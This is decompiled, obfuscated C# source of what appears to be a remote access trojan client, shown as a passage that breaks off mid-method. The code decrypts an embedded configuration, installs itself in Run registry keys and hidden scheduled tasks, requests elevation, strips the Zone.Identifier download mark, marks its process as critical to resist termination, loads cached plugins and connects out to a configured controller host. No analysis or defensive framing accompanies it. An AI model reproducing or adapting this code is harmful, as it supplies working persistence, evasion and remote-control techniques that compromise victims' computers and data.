using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

// Token: 0x02000014 RID: 20
[StandardModule]
internal sealed class Class8
{
	// Token: 0x0600005D RID: 93 RVA: 0x00003B4C File Offset: 0x00001D4C
	public static void smethod_0()
	{
		Application.ThreadException += Class8.smethod_58;
		AppDomain.CurrentDomain.UnhandledException += Class8.smethod_57;
		AppDomain.CurrentDomain.AssemblyResolve += Class8.smethod_69;
		Class8.list_3 = new List<string>();
		Class8.list_0 = new List<Guid>();
		Class8.dictionary_0 = new Dictionary<Guid, GStruct0>();
		Class8.dictionary_1 = new Dictionary<string, object>();
		Environment.CurrentDirectory = Application.StartupPath;
		if (!Class8.smethod_13())
		{
			Class8.smethod_17();
		}
		Class8.smethod_20();
		Class8.smethod_21();
		Class8.smethod_22();
		Class8.smethod_2();
		Class8.smethod_11();
		Class8.smethod_12();
		Class8.smethod_3();
		Class8.smethod_25();
		Class8.smethod_28();
		Class8.smethod_23();
		Class8.smethod_24();
		Class8.smethod_26();
		Class8.smethod_27();
		Class8.smethod_29();
		Class8.smethod_30();
		Class8.smethod_4();
		Class8.smethod_6();
		if (Class8.byte_1 != null)
		{
			Class8.smethod_9();
			Class8.smethod_8();
		}
		Class8.smethod_63();
		Class8.smethod_1();
		Class8.smethod_44();
	}

	// Token: 0x0600005E RID: 94 RVA: 0x00003C4C File Offset: 0x00001E4C
	private static void smethod_1()
	{
		Class8.client_0 = Class8.smethod_39();
		Class8.client_0.method_0(new Client.GDelegate6(Class8.smethod_70));
		Class8.client_0.method_4(new Client.GDelegate4(Class8.smethod_71));
		Class8.client_0.method_14(new Client.GDelegate9(Class8.smethod_72));
		Class8.client_0.method_2(new Client.GDelegate7(Class8.smethod_73));
		Class8.client_0.method_6(new Client.GDelegate2(Class8.smethod_76));
	}

	// Token: 0x0600005F RID: 95 RVA: 0x00003CD4 File Offset: 0x00001ED4
	private static void smethod_2()
	{
		Class24.guid_0 = Class8.smethod_33();
		Class24.bool_0 = Class8.smethod_32();
		Class24.intptr_0 = Class9.GetCurrentProcess();
		Class24.string_0 = Class8.smethod_34(Class24.guid_0);
		Class24.string_1 = Path.Combine(Path.Combine(Class24.string_0, "Exceptions"), Class24.smethod_1().ToString());
		Class24.dateTime_0 = Class8.smethod_35(Class24.string_0);
		Class24.bool_1 = (Environment.OSVersion.Version.Major > 5);
		GStruct1 gstruct = GStruct1.smethod_0(Class24.guid_0);
		Class24.string_2 = gstruct.string_0;
		Class24.string_3 = gstruct.string_1;
	}

	// Token: 0x06000060 RID: 96 RVA: 0x00003D7C File Offset: 0x00001F7C
	private static void smethod_3()
	{
		Class8.smethod_87("Builder settings loaded..");
		try
		{
			foreach (KeyValuePair<string, object> keyValuePair in Class8.dictionary_1)
			{
				Class8.smethod_87(string.Format("{0} = {1}", keyValuePair.Key, RuntimeHelpers.GetObjectValue(keyValuePair.Value)));
			}
		}
		finally
		{
			Dictionary<string, object>.Enumerator enumerator;
			((IDisposable)enumerator).Dispose();
		}
	}

	// Token: 0x06000061 RID: 97 RVA: 0x00003DF4 File Offset: 0x00001FF4
	private static void smethod_4()
	{
		string path = Path.Combine(Class24.string_0, "catalog.dat");
		if (!File.Exists(path))
		{
			return;
		}
		try
		{
			byte[] array = File.ReadAllBytes(path);
			object[] array2 = Class22.smethod_2(array);
			object[] array3 = array2;
			for (int i = 0; i < array3.Length; i++)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(array3[i]);
				Class8.list_0.Add((Guid)objectValue);
			}
			List<Guid> list = new List<Guid>();
			try
			{
				foreach (KeyValuePair<Guid, GStruct0> keyValuePair in Class8.dictionary_0)
				{
					if (!Class8.list_0.Contains(keyValuePair.Key))
					{
						list.Add(keyValuePair.Key);
					}
				}
			}
			finally
			{
				Dictionary<Guid, GStruct0>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			try
			{
				foreach (Guid key in list)
				{
					Class8.dictionary_0.Remove(key);
				}
			}
			finally
			{
				List<Guid>.Enumerator enumerator2;
				((IDisposable)enumerator2).Dispose();
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "LoadPluginCatalog");
		}
	}

	// Token: 0x06000062 RID: 98 RVA: 0x00003F34 File Offset: 0x00002134
	public static void smethod_5(Guid[] guid_0)
	{
		string path = Path.Combine(Class24.string_0, "catalog.dat");
		try
		{
			List<object> list = new List<object>();
			foreach (Guid guid in guid_0)
			{
				list.Add(guid);
			}
			byte[] bytes = Class22.smethod_1(list.ToArray());
			File.WriteAllBytes(path, bytes);
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "SavePluginCatalog");
		}
	}

	// Token: 0x06000063 RID: 99 RVA: 0x00003FC8 File Offset: 0x000021C8
	private static void smethod_6()
	{
		string path = Path.Combine(Class24.string_0, "storage.dat");
		if (!File.Exists(path))
		{
			return;
		}
		try
		{
			byte[] array = File.ReadAllBytes(path);
			object[] array2 = Class22.smethod_2(array);
			DateTime t = (DateTime)array2[0];
			if (DateTime.Compare(Class8.dateTime_0, t) < 0)
			{
				Class8.dateTime_0 = t;
				Class8.byte_1 = (byte[])array2[1];
				Class8.byte_0 = Class27.smethod_2(Class8.byte_1);
			}
			int num = 2;
			int num2 = array2.Length - 1;
			for (int i = num; i <= num2; i += 4)
			{
				GStruct0 value = default(GStruct0);
				value.guid_0 = (Guid)array2[i];
				value.dateTime_0 = (DateTime)array2[i + 1];
				value.string_0 = (string)array2[i + 2];
				value.byte_1 = (byte[])array2[i + 3];
				value.byte_0 = Class27.smethod_2(value.byte_1);
				if (Class8.list_0.Contains(value.guid_0))
				{
					if (Class8.dictionary_0.ContainsKey(value.guid_0))
					{
						if (DateTime.Compare(Class8.dictionary_0[value.guid_0].dateTime_0, value.dateTime_0) < 0)
						{
							Class8.dictionary_0[value.guid_0] = value;
						}
					}
					else
					{
						Class8.dictionary_0.Add(value.guid_0, value);
					}
				}
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "LoadCachedPlugins");
		}
	}

	// Token: 0x06000064 RID: 100 RVA: 0x00004174 File Offset: 0x00002374
	public static void smethod_7()
	{
		string path = Path.Combine(Class24.string_0, "storage.dat");
		try
		{
			List<object> list = new List<object>();
			list.Add(Class8.dateTime_0);
			list.Add(Class8.byte_1);
			try
			{
				foreach (GClass2 gclass in Class8.list_2)
				{
					if (gclass.bool_0)
					{
						list.Add(gclass.guid_0);
						list.Add(gclass.dateTime_0);
						list.Add(gclass.string_0);
						list.Add(gclass.byte_0);
					}
				}
			}
			finally
			{
				List<GClass2>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			byte[] bytes = Class22.smethod_1(list.ToArray());
			File.WriteAllBytes(path, bytes);
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "SaveCachedPlugins");
		}
	}

	// Token: 0x06000065 RID: 101 RVA: 0x00004270 File Offset: 0x00002470
	private static void smethod_8()
	{
		Class8.smethod_87("Initializing cached plugins..");
		try
		{
			foreach (KeyValuePair<Guid, GStruct0> keyValuePair in Class8.dictionary_0)
			{
				GStruct0 value = keyValuePair.Value;
				GClass2 gclass = new GClass2();
				gclass.string_0 = value.string_0;
				gclass.guid_0 = value.guid_0;
				gclass.bool_0 = true;
				gclass.byte_0 = value.byte_1;
				gclass.byte_1 = value.byte_0;
				Class23.smethod_0(value.byte_1, gclass);
			}
		}
		finally
		{
			Dictionary<Guid, GStruct0>.Enumerator enumerator;
			((IDisposable)enumerator).Dispose();
		}
		Class8.dictionary_0.Clear();
	}

	// Token: 0x06000066 RID: 102 RVA: 0x00004328 File Offset: 0x00002528
	public static void smethod_9()
	{
		if (Class8.bool_5)
		{
			return;
		}
		Class8.bool_5 = true;
		Class8.dictionary_2 = new Dictionary<string, Client>();
		Class8.list_2 = new List<GClass2>();
		Class8.gclass6_0 = new GClass6(new GDelegate0(Class8.smethod_66));
		Class8.gclass6_1 = new GClass6(new GDelegate0(Class8.smethod_67));
		Class8.gclass8_0 = new GClass8(Class8.dictionary_1);
		Class8.smethod_10();
		Class8.smethod_93("settings.bin");
		Class8.gclass5_0 = new GClass5();
		Class8.gclass5_0.method_0(new GClass5.GDelegate1(Class8.smethod_94));
		Class8.gclass5_0.method_3(1000);
		Class8.gclass5_0.method_6();
	}

	// Token: 0x06000067 RID: 103 RVA: 0x000043DC File Offset: 0x000025DC
	private static void smethod_10()
	{
		Class8.gclass6_0.SetValue("ClientId", Class24.guid_0);
		Class8.gclass6_0.SetValue("FirstRunDate", Class24.dateTime_0);
		Class8.gclass6_0.SetValue("IsRunningAsAdmin", Class24.bool_0);
		Class8.gclass6_0.SetValue("IsVistaOrLater", Class24.bool_1);
		Class8.gclass6_0.SetValue("ApplicationFolder", Class24.string_0);
		Class8.gclass6_0.SetValue("ClientFriendlyName", Class24.string_2);
		Class8.gclass6_0.SetValue("ClientExecutableName", Class24.string_3);
		Class8.gclass6_0.SetValue("ProcessHandle", Class24.intptr_0);
	}

	// Token: 0x06000068 RID: 104 RVA: 0x000044A4 File Offset: 0x000026A4
	private static void smethod_11()
	{
		Class8.string_1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		Class8.string_0 = Path.Combine(Class24.string_2, Class24.string_3);
		Class8.string_3 = Path.Combine(Class24.string_0, Class8.string_0);
		Class8.string_2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), Class8.string_0);
	}

	// Token: 0x06000069 RID: 105 RVA: 0x000044FC File Offset: 0x000026FC
	private static void smethod_12()
	{
		Class8.queue_0 = new Queue<string>();
		try
		{
			if (Directory.Exists(Class24.string_1))
			{
				foreach (string path in Directory.GetFiles(Class24.string_1, "*.dat"))
				{
					Class8.queue_0.Enqueue(Path.GetFileNameWithoutExtension(path));
				}
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "InitializeExceptionQueue");
		}
	}

	// Token: 0x0600006A RID: 106 RVA: 0x00004580 File Offset: 0x00002780
	private static bool smethod_13()
	{
		byte[] array = Class8.smethod_16();
		if (array != null)
		{
			MemoryStream input = new MemoryStream(array);
			BinaryReader binaryReader = new BinaryReader(input);
			byte[] byte_ = binaryReader.ReadBytes(binaryReader.ReadInt32());
			Guid guid_ = Class8.smethod_18(Assembly.GetExecutingAssembly());
			Class8.byte_2 = Class8.smethod_19(byte_, guid_);
			Class22.smethod_0(Class8.byte_2);
			byte[] array2 = binaryReader.ReadBytes(binaryReader.ReadInt32());
			object[] array3 = Class22.smethod_2(array2);
			int num;
			object[] array4 = new object[(int)array3[num] - 1 + 1];
			num++;
			Array.Copy(array3, num, array4, 0, array4.Length);
			num += array4.Length;
			object[] array5 = new object[(int)array3[num] - 1 + 1];
			num++;
			Array.Copy(array3, num, array5, 0, array5.Length);
			Class8.smethod_14(array5);
			Class8.smethod_15(array4);
			return true;
		}
		return false;
	}

	// Token: 0x0600006B RID: 107 RVA: 0x00004668 File Offset: 0x00002868
	private static void smethod_14(object[] object_0)
	{
		int num = 0;
		int num2 = object_0.Length - 1;
		for (int i = num; i <= num2; i += 2)
		{
			string key = (string)object_0[i];
			object objectValue = RuntimeHelpers.GetObjectValue(object_0[i + 1]);
			if (Class8.dictionary_1.ContainsKey(key))
			{
				Class8.dictionary_1[key] = RuntimeHelpers.GetObjectValue(objectValue);
			}
			else
			{
				Class8.dictionary_1.Add(key, RuntimeHelpers.GetObjectValue(objectValue));
			}
		}
	}

	// Token: 0x0600006C RID: 108 RVA: 0x000046CC File Offset: 0x000028CC
	private static void smethod_15(object[] object_0)
	{
		if (object_0.Length == 0)
		{
			return;
		}
		Class8.dateTime_0 = (DateTime)object_0[0];
		Class8.byte_1 = (byte[])object_0[1];
		Class8.byte_0 = Class27.smethod_2(Class8.byte_1);
		int num = 2;
		int num2 = object_0.Length - 1;
		for (int i = num; i <= num2; i += 4)
		{
			GStruct0 value = default(GStruct0);
			value.guid_0 = (Guid)object_0[i];
			value.dateTime_0 = (DateTime)object_0[i + 1];
			value.string_0 = (string)object_0[i + 2];
			value.byte_1 = (byte[])object_0[i + 3];
			value.byte_0 = Class27.smethod_2(value.byte_1);
			Class8.dictionary_0.Add(value.guid_0, value);
		}
	}

	// Token: 0x0600006D RID: 109 RVA: 0x0000479C File Offset: 0x0000299C
	private static byte[] smethod_16()
	{
		IntPtr intPtr = Class9.FindResourceEx(IntPtr.Zero, 10, 1, 0);
		if (intPtr == IntPtr.Zero)
		{
			return null;
		}
		IntPtr intPtr2 = Class9.LoadResource(IntPtr.Zero, intPtr);
		if (intPtr2 == IntPtr.Zero)
		{
			return null;
		}
		int num = Class9.SizeofResource(IntPtr.Zero, intPtr);
		if (num == 0)
		{
			return null;
		}
		IntPtr intPtr3 = Class9.LockResource(intPtr2);
		if (intPtr3 == IntPtr.Zero)
		{
			return null;
		}
		byte[] array = new byte[num - 1 + 1];
		Marshal.Copy(intPtr3, array, 0, array.Length);
		return array;
	}

	// Token: 0x0600006E RID: 110 RVA: 0x0000240E File Offset: 0x0000060E
	private static void smethod_17()
	{
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00004828 File Offset: 0x00002A28
	private static Guid smethod_18(Assembly assembly_1)
	{
		Guid result = new Guid(((GuidAttribute)assembly_1.GetCustomAttributes(typeof(GuidAttribute), false)[0]).Value);
		return result;
	}

	// Token: 0x06000070 RID: 112 RVA: 0x0000485C File Offset: 0x00002A5C
	private static byte[] smethod_19(byte[] byte_3, Guid guid_0)
	{
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(guid_0.ToByteArray(), guid_0.ToByteArray(), 8);
		return new RijndaelManaged
		{
			IV = rfc2898DeriveBytes.GetBytes(16),
			Key = rfc2898DeriveBytes.GetBytes(16)
		}.CreateDecryptor().TransformFinalBlock(byte_3, 0, byte_3.Length);
	}

	// Token: 0x06000071 RID: 113 RVA: 0x000048B0 File Offset: 0x00002AB0
	private static void smethod_20()
	{
		if (!Class24.smethod_16())
		{
			return;
		}
		if (Class9.AllocConsole())
		{
			Class8.bool_2 = true;
		}
		try
		{
			Class8.streamWriter_0 = new StreamWriter("client.log", true);
			Class8.streamWriter_0.AutoFlush = true;
			Class8.bool_3 = true;
		}
		catch (Exception exception_)
		{
			if (Class8.bool_2)
			{
				Class8.smethod_86(exception_, "HandleEnableDebugModeBuilderSetting");
			}
		}
	}

	// Token: 0x06000072 RID: 114 RVA: 0x00004928 File Offset: 0x00002B28
	private static void smethod_21()
	{
		int num = 0;
		int num2 = Class24.smethod_22();
		for (int i = num; i <= num2; i += 250)
		{
			bool flag;
			Class8.mutex_0 = new Mutex(true, string.Format("Global\\{{{0}}}", Class24.smethod_2()), ref flag);
			if (flag)
			{
				return;
			}
			Thread.Sleep(250);
		}
		Class8.smethod_42();
	}

	// Token: 0x06000073 RID: 115 RVA: 0x00002410 File Offset: 0x00000610
	private static void smethod_22()
	{
		if (Class24.smethod_17() != 0)
		{
			Thread.Sleep(Class24.smethod_17());
		}
	}

	// Token: 0x06000074 RID: 116 RVA: 0x00002424 File Offset: 0x00000624
	private static void smethod_23()
	{
		if (!Class24.smethod_11())
		{
			return;
		}
		Class8.smethod_38(Application.ExecutablePath);
	}

	// Token: 0x06000075 RID: 117 RVA: 0x00004980 File Offset: 0x00002B80
	private static void smethod_24()
	{
		if (!Class24.smethod_8())
		{
			return;
		}
		if (!Class24.bool_0)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(Application.ExecutablePath);
			processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
			processStartInfo.Verb = "runas";
			try
			{
				Process.Start(processStartInfo);
				Class8.smethod_42();
			}
			catch (Exception exception_)
			{
				Class8.smethod_86(exception_, "HandleRequestElevationBuilderSetting");
			}
		}
	}

	// Token: 0x06000076 RID: 118 RVA: 0x00002438 File Offset: 0x00000638
	private static void smethod_25()
	{
		if (!Class24.smethod_7())
		{
			return;
		}
		if (Class24.bool_0)
		{
			Class8.smethod_54();
		}
		else
		{
			Class8.smethod_52();
		}
	}

	// Token: 0x06000077 RID: 119 RVA: 0x00002455 File Offset: 0x00000655
	private static void smethod_26()
	{
		if (!Class24.smethod_12())
		{
			return;
		}
		Class26.smethod_2();
	}

	// Token: 0x06000078 RID: 120 RVA: 0x00002465 File Offset: 0x00000665
	private static void smethod_27()
	{
		if (!Class24.smethod_13())
		{
			return;
		}
		Class8.smethod_40(true);
	}

	// Token: 0x06000079 RID: 121 RVA: 0x000049F4 File Offset: 0x00002BF4
	private static void smethod_28()
	{
		if (Class24.smethod_9())
		{
			if (!Class24.bool_1)
			{
				return;
			}
			string text = Class24.bool_0 ? Class8.string_2 : Class8.string_3;
			if (Class24.bool_0)
			{
				if (Class24.smethod_10() == null)
				{
					return;
				}
				string @string = Encoding.UTF8.GetString(Class24.smethod_10());
				if (!string.Equals(Application.ExecutablePath, text, StringComparison.InvariantCultureIgnoreCase))
				{
					string string_ = @string.Replace("#EXECUTABLEPATH", Application.ExecutablePath);
					if (Class8.smethod_47(Class24.string_2, string_, 10000))
					{
						Class8.smethod_37(Application.ExecutablePath);
					}
				}
				if (Class24.smethod_7())
				{
					string string_2 = @string.Replace("#EXECUTABLEPATH", text);
					Class8.smethod_47(Class24.string_2 + " Task", string_2, 10000);
				}
			}
			else
			{
				string text2 = Class24.string_2;
				if (string.Equals(Application.ExecutablePath, text, StringComparison.InvariantCultureIgnoreCase))
				{
					text2 += " Task";
				}
				else if (!string.Equals(Application.ExecutablePath, Class8.smethod_36(), StringComparison.InvariantCultureIgnoreCase))
				{
					return;
				}
				if (Class8.smethod_48(text2, 10000))
				{
					Class8.smethod_42();
				}
			}
		}
	}

	// Token: 0x0600007A RID: 122 RVA: 0x00004B00 File Offset: 0x00002D00
	private static void smethod_29()
	{
		if (!Class24.smethod_31())
		{
			return;
		}
		if (string.Equals(Application.ExecutablePath, Class8.string_3, StringComparison.InvariantCultureIgnoreCase))
		{
			return;
		}
		if (string.Equals(Application.ExecutablePath, Class8.string_2, StringComparison.InvariantCultureIgnoreCase))
		{
			return;
		}
		ThreadPool.QueueUserWorkItem(delegate(object object_0)
		{
			delegate
			{
				MessageBox.Show(Class24.smethod_33(), Class24.smethod_32(), MessageBoxButtons.OK, (MessageBoxIcon)Class24.smethod_34(), MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
			}();
		});
	}

	// Token: 0x0600007B RID: 123 RVA: 0x00002475 File Offset: 0x00000675
	private static void smethod_30()
	{
		if (Class24.smethod_14())
		{
			ThreadPool.QueueUserWorkItem(delegate(object object_0)
			{
				delegate
				{
					Class8.smethod_95();
				}();
			});
		}
	}

	// Token: 0x0600007C RID: 124 RVA: 0x00004B50 File Offset: 0x00002D50
	private static bool smethod_31()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", false);
		return registryKey == null || Conversions.ToInteger(registryKey.GetValue("EnableLUA", 1)) == 1;
	}

	// Token: 0x0600007D RID: 125 RVA: 0x00004B8C File Offset: 0x00002D8C
	private static bool smethod_32()
	{
		if (!Class8.smethod_31())
		{
			return true;
		}
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	// Token: 0x0600007E RID: 126 RVA: 0x00004BB8 File Offset: 0x00002DB8
	private static Guid smethod_33()
	{
		string text = Class26.smethod_0("SOFTWARE\\Microsoft\\Cryptography", "MachineGuid");
		if (string.IsNullOrEmpty(text))
		{
			return Guid.Empty;
		}
		Guid result = new Guid(text);
		return result;
	}

	// Token: 0x0600007F RID: 127 RVA: 0x00004BEC File Offset: 0x00002DEC
	private static string smethod_34(Guid guid_0)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), guid_0.ToString().ToUpper());
		try
		{
			Directory.CreateDirectory(text);
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "GetAndCreateApplicationFolderPath");
		}
		return text;
	}

	// Token: 0x06000080 RID: 128 RVA: 0x00004C4C File Offset: 0x00002E4C
	private static DateTime smethod_35(string string_4)
	{
		DateTime result = DateTime.UtcNow;
		string path = Path.Combine(string_4, "run.dat");
		try
		{
			if (File.Exists(path))
			{
				byte[] value = File.ReadAllBytes(path);
				result = DateTime.FromBinary(BitConverter.ToInt64(value, 0));
			}
			else
			{
				File.WriteAllBytes(path, BitConverter.GetBytes(result.ToBinary()));
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "GetAndCreateFirstRunDate");
		}
		return result;
	}

	// Token: 0x06000081 RID: 129 RVA: 0x00004CC8 File Offset: 0x00002EC8
	private static string smethod_36()
	{
		string path = Path.Combine(Class24.string_0, "task.dat");
		if (!File.Exists(path))
		{
			return null;
		}
		try
		{
			string text = File.ReadAllText(path);
			if (File.Exists(text))
			{
				return text;
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "GetUACTaskPath");
		}
		return null;
	}

	// Token: 0x06000082 RID: 130 RVA: 0x00004D30 File Offset: 0x00002F30
	private static void smethod_37(string string_4)
	{
		string path = Path.Combine(Class24.string_0, "task.dat");
		try
		{
			File.WriteAllText(path, string_4);
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "CreateUACTaskPath");
		}
	}

	// Token: 0x06000083 RID: 131 RVA: 0x00002490 File Offset: 0x00000690
	private static void smethod_38(string string_4)
	{
		Class9.DeleteFile(string_4 + ":Zone.Identifier");
	}

	// Token: 0x06000084 RID: 132 RVA: 0x00004D80 File Offset: 0x00002F80
	public static Client smethod_39()
	{
		Client client = new Client();
		client.method_27(Class24.smethod_23());
		client.method_29(Class24.smethod_24());
		client.method_19(Class24.smethod_25());
		client.method_21(Class24.smethod_26());
		client.method_25(Class24.smethod_27());
		client.method_40(Class24.smethod_28());
		if (Class24.smethod_28())
		{
			IPAddress item = null;
			List<IPAddress> list = new List<IPAddress>();
			if (IPAddress.TryParse(Class24.smethod_29(), out item))
			{
				list.Add(item);
			}
			if (IPAddress.TryParse(Class24.smethod_30(), out item))
			{
				list.Add(item);
			}
			client.method_42(list.ToArray());
		}
		return client;
	}

	// Token: 0x06000085 RID: 133 RVA: 0x00004E1C File Offset: 0x0000301C
	public static void smethod_40(bool bool_6)
	{
		if (!Class24.bool_0)
		{
			return;
		}
		try
		{
			Process.EnterDebugMode();
			int num = bool_6 ? 1 : 0;
			int num2 = Class9.NtSetInformationProcess(Class24.intptr_0, 29, ref num, 4);
			if (num2 != 0)
			{
				Class8.smethod_86(new Exception(string.Format("Call to NtSetInformationProcess has failed with error code {0:X}", num2)), "UpdateProcessBreakOnTermination");
			}
			Process.LeaveDebugMode();
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "UpdateProcessBreakOnTermination");
		}
	}

	// Token: 0x06000086 RID: 134 RVA: 0x000024A3 File Offset: 0x000006A3
	public static void smethod_41()
	{
		Process.Start(Application.ExecutablePath);
		Class8.smethod_42();
	}

	// Token: 0x06000087 RID: 135 RVA: 0x000024B5 File Offset: 0x000006B5
	public static void smethod_42()
	{
		Class8.smethod_40(false);
		Environment.Exit(0);
	}

	// Token: 0x06000088 RID: 136 RVA: 0x000024C3 File Offset: 0x000006C3
	public static void smethod_43()
	{
		Thread.Sleep(Class24.smethod_18());
		Class8.smethod_44();
	}

	// Token: 0x06000089 RID: 137 RVA: 0x00004EA4 File Offset: 0x000030A4
	private static void smethod_44()
	{
		string arg = Class8.smethod_65();
		Class8.smethod_87(string.Format("Connecting to {0}:{1}..", arg, Class24.smethod_6()));
		Class8.client_0.method_44(arg, Class24.smethod_6());
	}

	// Token: 0x0600008A RID: 138 RVA: 0x000024D4 File Offset: 0x000006D4
	public static void smethod_45()
	{
		if (Interlocked.Increment(ref Class8.long_0) == 1L)
		{
			Class26.smethod_1();
			Class8.smethod_40(false);
		}
	}

	// Token: 0x0600008B RID: 139 RVA: 0x000024F7 File Offset: 0x000006F7
	public static void smethod_46()
	{
		if (Class8.long_0 == 0L)
		{
			return;
		}
		if (Interlocked.Decrement(ref Class8.long_0) == 0L)
		{
			if (Class24.smethod_12())
			{
				Class8.smethod_26();
			}
			if (Class24.smethod_13())
			{
				Class8.smethod_27();
			}
		}
	}

	// Token: 0x0600008C RID: 140 RVA: 0x00004EE4 File Offset: 0x000030E4
	private static bool smethod_47(string string_4, string string_5, int int_2)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			string string_6 = string.Format("/create /f /tn \"{0}\" /xml \"{1}\"", string_4, tempFileName);
			File.WriteAllText(tempFileName, string_5);
			ProcessStartInfo startInfo = Class8.smethod_50("schtasks.exe", string_6);
			Process process = Process.Start(startInfo);
			bool result;
			if (process.WaitForExit(int_2))
			{
				result = (process.ExitCode == 0);
			}
			File.Delete(tempFileName);
			return result;
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "CreateScheduledTask");
		}
		return false;
	}

	// Token: 0x0600008D RID: 141 RVA: 0x00004F70 File Offset: 0x00003170
	private static bool smethod_48(string string_4, int int_2)
	{
		try
		{
			string string_5 = string.Format("/run /tn \"{0}\"", string_4);
			ProcessStartInfo startInfo = Class8.smethod_50("schtasks.exe", string_5);
			Process process = Process.Start(startInfo);
			bool result;
			if (process.WaitForExit(int_2))
			{
				result = (process.ExitCode == 0);
			}
			return result;
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "RunScheduledTask");
		}
		return false;
	}

	// Token: 0x0600008E RID: 142 RVA: 0x00004FE4 File Offset: 0x000031E4
	private static bool smethod_49(string string_4, int int_2)
	{
		try
		{
			string string_5 = string.Format("/delete /f /tn \"{0}\"", string_4);
			ProcessStartInfo startInfo = Class8.smethod_50("schtasks.exe", string_5);
			Process process = Process.Start(startInfo);
			bool result;
			if (process.WaitForExit(int_2))
			{
				result = (process.ExitCode == 0);
			}
			return result;
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "DeleteScheduledTask");
		}
		return false;
	}

	// Token: 0x0600008F RID: 143 RVA: 0x00005058 File Offset: 0x00003258
	private static ProcessStartInfo smethod_50(string string_4, string string_5)
	{
		return new ProcessStartInfo(string_4, string_5)
		{
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden
		};
	}

	// Token: 0x06000090 RID: 144 RVA: 0x00005084 File Offset: 0x00003284
	private static bool smethod_51(string string_4)
	{
		if (!File.Exists(string_4))
		{
			return false;
		}
		FileStream fileStream = null;
		try
		{
			fileStream = File.OpenRead(Application.ExecutablePath);
			string left = Class27.smethod_3(fileStream);
			fileStream.Close();
			fileStream = File.OpenRead(string_4);
			string right = Class27.smethod_3(fileStream);
			fileStream.Close();
			return Operators.CompareString(left, right, false) == 0;
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "CompareFileHashes");
		}
		finally
		{
			if (fileStream != null)
			{
				fileStream.Close();
			}
		}
		return false;
	}

	// Token: 0x06000091 RID: 145 RVA: 0x0000511C File Offset: 0x0000331C
	private static void smethod_52()
	{
		try
		{
			if (!Class8.smethod_56())
			{
				Directory.CreateDirectory(Path.GetDirectoryName(Class8.string_3));
				if (!Class8.smethod_51(Class8.string_3))
				{
					File.Delete(Class8.string_3);
					File.Copy(Application.ExecutablePath, Class8.string_3);
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class8.string_1, true);
				registryKey.SetValue(Class24.string_2, Class8.string_3);
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "AddUserStartup");
		}
	}

	// Token: 0x06000092 RID: 146 RVA: 0x000051B4 File Offset: 0x000033B4
	private static void smethod_53()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class8.string_1, true);
			if (registryKey.GetValue(Class24.string_2, null) != null)
			{
				registryKey.DeleteValue(Class24.string_2);
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "DeleteUserStartup");
		}
		try
		{
			if (!string.Equals(Application.ExecutablePath, Class8.string_3, StringComparison.InvariantCultureIgnoreCase))
			{
				File.Delete(Class8.string_3);
			}
		}
		catch (Exception exception_2)
		{
			Class8.smethod_86(exception_2, "DeleteUserStartup");
		}
	}

	// Token: 0x06000093 RID: 147 RVA: 0x0000525C File Offset: 0x0000345C
	private static void smethod_54()
	{
		try
		{
			Directory.CreateDirectory(Path.GetDirectoryName(Class8.string_2));
			if (!Class8.smethod_51(Class8.string_2))
			{
				File.Delete(Class8.string_2);
				File.Copy(Application.ExecutablePath, Class8.string_2);
			}
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class8.string_1, true);
			registryKey.SetValue(Class24.string_2, Class8.string_2);
			Class8.smethod_53();
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "AdminAdminStartup");
		}
	}

	// Token: 0x06000094 RID: 148 RVA: 0x000052F0 File Offset: 0x000034F0
	private static void smethod_55()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class8.string_1, true);
			if (registryKey.GetValue(Class24.string_2, null) != null)
			{
				registryKey.DeleteValue(Class24.string_2);
			}
		}
		catch (Exception exception_)
		{
			Class8.smethod_86(exception_, "DeleteAdminStartup");
		}
		try
		{
			if (!string.Equals(Application.ExecutablePath, Class8.string_2, StringComparison.InvariantCultureIgnoreCase))
			{
				File.Delete(Class8.string_2);
			}
		}
